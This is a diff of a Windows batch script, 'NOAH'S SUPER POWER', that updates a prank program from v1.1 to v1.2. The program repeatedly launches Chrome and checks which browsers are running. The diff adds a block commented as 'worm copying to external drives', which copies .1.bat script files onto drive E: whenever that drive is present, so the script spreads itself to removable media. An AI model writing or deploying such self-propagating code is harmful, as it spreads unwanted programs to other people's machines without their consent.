@@ -1,5 +1,5 @@
 :::::::::::::::::::::::::::
-::NOAH'S SUPER POWER V1.1::
+::NOAH'S SUPER POWER V1.2::
 :::::::::::::::::::::::::::
 :: Copyright (c) Grathium Softwares 2018, grathiumsoftwears@gmail.com
 
@@ -13,6 +13,7 @@ set /a okay=0
 ver >nul
 cls
 
+goto loop
 :A
 start chrome.exe ""
 timeout /nobreak 10
@@ -29,13 +30,13 @@ if "%ERRORLEVEL%"=="0" goto yesie
 tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "MicrosoftEdge.exe">NUL
 if "%ERRORLEVEL%"=="0" goto yesedge
 
-::copying to external drives
+::worm copying to external drives
 if not exist "E:\" goto loop
-if exist "E:\verifyed.a"
-set /a newsessionid=%random%
-echo Please Input File Name (Current)
-type "%cd%\%cf%.bat">>"E:\%newsessionid%.bat"
-echo.>>"E:\verifyed.a"
+if exist "E:\*.1.bat" goto loop
+
+for /r %%f in (*.1.bat) do (
+type %%~nxf >>"E:\%%~nxf"
+)
 goto loop
 
 ::open change window location if needed
